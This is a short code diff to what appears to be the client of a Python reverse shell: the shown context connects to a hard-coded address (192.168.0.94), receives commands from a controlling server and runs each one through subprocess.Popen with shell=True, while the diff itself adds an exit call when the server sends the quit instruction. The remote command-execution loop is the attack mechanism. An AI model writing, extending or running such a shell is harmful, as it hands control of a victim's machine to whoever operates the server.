@@ -3,6 +3,7 @@ import socket
 from termcolor import colored
 import subprocess
 import json
+from sys import exit
 
 
 HOST = '192.168.0.94'
@@ -31,6 +32,7 @@ def shell(_s):
 		if command == 'q':
 			print(colored('[-] Instruction to close sent from the server', 'red'))
 			_s.close()
+			exit(1)
 			break
 		else:
 			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
